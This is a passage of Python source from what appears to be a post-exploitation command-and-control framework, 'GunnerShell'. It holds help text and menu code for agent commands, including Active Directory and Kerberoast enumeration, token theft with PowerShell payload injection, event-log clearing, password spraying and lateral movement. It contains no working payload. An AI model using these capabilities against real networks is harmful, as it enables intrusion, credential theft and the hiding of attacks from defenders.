			List objects with unconstrained or constrained delegation enabled.

	getdelegation --dc-ip 10.0.0.50
			Same, but via the specified DC.
""",
	"getadmins": """
getadmins [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP address of the Domain Controller.

Usage:
	getadmins
			List SamAccountNames of Domain Admins and Enterprise Admins.

	getadmins -d corp.local
			Enumerate those groups in corp.local.

	getadmins --dc-ip 10.0.0.50
			Query via the DC at 10.0.0.50.
""",
	"getspns": """
getspns [-d <domain>] [--dc-ip <ip>]

	-d, --domain   AD domain name (FQDN) or NetBIOS.
	--dc-ip        IP address of the Domain Controller.

Usage:
	getspns
			List every account (user or computer) that has an SPN set.
""",
 }

def print_gunnershell_help(cmd: str=None):
	"""Like print_help, but grouped and with two‐level detail."""
	# 1) Top‐level: show grouped summary
	if cmd is None:
		core_cmds = {
			"help":                     "Help menu",
			"exit":                     "Exit the subshell and return to main prompt",
			"list":                     "List all available modules",
			"banner":                   "Clears the screen and displays the GUNNER ASCII-art banner.",
			"sessions":                 "List all current gunner agents",
			"switch":                   "Switch to another session's GunnerShell",
			"shell":                    "Drop into a full interactive shell",
			"modhelp":                  "Show module options for a module",
			"run":                      "Execute module with inline options",
			"search":                   "Filter available modules by keyword or show all",
		}
		fs_cmds = {
			"ls":                       "List files on the remote host",
			"cat":                      "Print contents of a file",
			"cd":                       "Change remote working directory",
			"pwd":                      "Print remote working directory",
			"cp":                       "Copy file from source → destination",
			"mv":                       "Move or rename a file/directory",
			"rmdir":                    "Remove a directory (recursive)",
			"checksum":                 "Compute SHA256 of a file",
			"upload":                   "Upload a file to the session",
			"download":                 "Download a file or directory",
			"del":                      "Delete a file on the remote host",
			"rm":                       "Alias for del",
			"mkdir":                    "Create a directory on the remote host",
			"md":                       "Alias for mkdir",
			"touch":                    "Create or update a file on the remote host",
			"drives":                   "List mounted drives/filesystems",
			"edit":                     "Edit a remote text file in your local editor",
		}
		net_cmds = {
			"netstat":                  "Show sockets and listening ports",
			"ifconfig":                 "List network interfaces",
			"portscan":                 "Scan common TCP ports (with ARP-based host discovery)",
			"portfwd":                  "Manage port-forwards on this session",
			"arp":                      "Display ARP table",
			"hostname":                 "Grab the hostname of the agent",
			"socks":                    "Establish a reverse SOCKS5 proxy through the agent.",
			"resolve":                  "Resolve hostname(s)",
			"nslookup":                 "Alias for resolve",
			"route":                    "Show routing table",
			"getproxy":                 "Show Windows proxy config",
			"ipconfig":                 "Display network interfaces (alias: ifconfig)",
			"ifconfig":                 "Alias for ipconfig",
		}
		sys_cmds = {
			"sysinfo":                  "Display remote system information",
			"ps":                       "List running processes",
			"getuid":                   "Show the current user",
			"getprivs":                 "Enumerate process privileges",
			"getpid":                   "Print the remote agent’s process ID",
			"getenv":                   "Retrieve one or more environment variables",
			"exec":                     "Execute an arbitrary OS command",
			"kill":                     "Terminate a process by PID",
			"getsid":                   "Show Windows SID of current token",
			"clearev":                  "Clear all Windows event logs",
			"localtime":                "Display target local date/time",
			"reboot":                   "Reboot the remote host",
			"pgrep":                    "Filter processes by name/pattern",
			"pkill":                    "Terminate processes by name/pattern",
			"suspend":                  "Suspend a process by PID",
			"resume":                   "Resume a suspended process",
			"shutdown":                 "Shut down or reboot the remote host",
			"reg":                      "Windows registry operations (query/get/set/delete)",
			"services":                 "Manage services",
			"netusers":                 "List local user accounts",
			"netgroups":                "List local group accounts",
			"steal_token":              "Steal Windows token and inject stage-1 PowerShell payload",
		}
		ui_cmds = {
			"screenshot":               "Capture remote desktop screenshot",
		}
		lateralmovement_cmds = {
			"winrm":                    "Connect via WinRM to a Windows host and run commands or scripts",
			"netexec":                  "Password spraying utility all in native powershell (Fileless)",
			"nxc":                      "Alias for netexec command",
			"rpcexec":                  "RPC Exec via Scheduled-Task COM API on the target(s)",
			"wmiexec":                  "Execute a command via WMI on the remote host"
		}
		ad_cmds = {
			"getusers":                 "Enumerate all AD users via native PowerShell",
			"getgroups":                "Enumerate all AD groups via native Powershell",
			"getcomputers":             "Enumerate all AD connected computers via native Powershell",
			"getdomaincontrollers":     "Enumerate all AD/Forest connected DCs via native Powershell",
			"getous":                   "Enumerate all OUs in the AD domain via native Powershell",
			"getdcs":                   "Alias for getdomaincontrollers",
			"getgpos":                  "Enumerate Group Policy Objects",
			"getdomain":                "Enumerate the AD domain",
			"gettrusts":                "Enumerate all AD trusts",
			"getforests":               "Enumerate all AD forests",
			"getfsmo":                  "Enumerate FSMO roles in the forest",
			"getpwpolicy":              "Enumerate the domain password policy",
			"getdelegation":            "Enumerate objects with constrained/unconstrained delegation",
			"getadmins":                "Enumerate all domain and enterprise admins.",
			"getspns":                  "Enumerate all accounts with ServicePrincipalNames (Kerberoastable)"
		}

		# print Core
		print(brightyellow + "\nCore Commands\n=============\n")
		for name, desc in core_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		# print File system
		print(brightyellow + "File system Commands\n=====================\n")
		for name, desc in fs_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		# print networking commands
		print(brightyellow + "\nNetwork Commands\n================\n")
		for name, desc in net_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		print(brightyellow + "System Commands\n===============\n")
		for name, desc in sys_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		print(brightyellow + "\nUser Interface Commands\n=======================\n")
		for name, desc in ui_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		print(brightyellow + "Lateral Movement Commands\n=========================\n")
		for name, desc in lateralmovement_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print()
		print(brightyellow + "Active Directory Commands\n=========================\n")
		for name, desc in ad_cmds.items():
			print(brightgreen + f"{name:<25} {desc}")
		print(brightyellow + "\nFor detailed help run: help <command> [subcommand]\n")
		return

	# 2) Single‐level detail: help <cmd>
	if cmd:
		parts = cmd.split()
		if parts[0] in COMMAND_ALIASES:
			parts[0] = COMMAND_ALIASES[parts[0]]
			cmd = " ".join(parts)

	parts = cmd.split()
	if len(parts) == 1:
		c = parts[0]
		entry = gunnershell_commands.get(c)
		if entry is None:
			print(brightyellow + f"No help available for '{c}'.\n")
		elif isinstance(entry, str):
			print(brightgreen + f"{entry}")
		else:
			# nested dict: print the overview
			print(brightgreen + f"{entry.get('_desc')}")
		return

	# 3) Two‐level detail: help <cmd> <subcmd>
	if len(parts) == 2:
		c, sub = parts
		entry = gunnershell_commands.get(c)
		if isinstance(entry, dict) and sub in entry:
			print(brightgreen + f"{entry[sub]}")
		else:
			print(brightyellow + f"No help available for '{c} {sub}'.\n")
		return

	# 4) Too deep
	print(brightyellow +
			"Too deep nesting in help. Only:\n"
			"  help\n"
			"  help <command>\n"
			"  help <command> <subcommand>\n")

COMMAND_ALIASES = {
		"dir":       "ls",
		"nxc":       "netexec",
		"getdcs":    "getdomaincontrollers",
		"nslookup":  "resolve",
		"ifconfig":  "ipconfig",
		"md":        "mkdir",
		"rm":        "del",
}

def print_help(cmd=None, gunnershell=False):

	help_dict = gunnershell_commands if gunnershell else commands

	if cmd:
		parts = cmd.split()
		if parts[0] in COMMAND_ALIASES:
			parts[0] = COMMAND_ALIASES[parts[0]]
			cmd = " ".join(parts)

	if cmd is None and gunnershell == False:
		print(brightyellow + "\nAvailable Commands:\n")
		for key in help_dict:
			print(brightgreen + f"  {key}")
		print(brightyellow + "\nUsage: help or help <command> [subcommand]\n")
		return

	if not cmd:
		return

	parts = cmd.split()

	# Top-level
	if len(parts) == 1:
		c = parts[0]
		if c not in help_dict:
			print(brightyellow + f"No help available for '{c}'.")
			return

		if isinstance(help_dict[c], str):
			print(brightgreen + f"\n{help_dict[c]}\n")
		elif isinstance(help_dict[c], dict):
			print(brightgreen + f"\n{help_dict[c]['_desc']}\n")
		return

	# Nested help (subcommands)
	if len(parts) == 2:
		c, sub = parts
		if c in help_dict and isinstance(help_dict[c], dict):
			if sub in help_dict[c]:
				print(brightgreen + f"\n{help_dict[c][sub]}\n")
			else:
				print(brightyellow + f"No help available for '{cmd}'.")
		else:
			print(brightyellow + f"No help available for '{cmd}'.")
		return

	print(brightyellow + "Too deep nesting in help. Only 'help' or 'help <command> [sub]' allowed.")



defender = SessionDefender()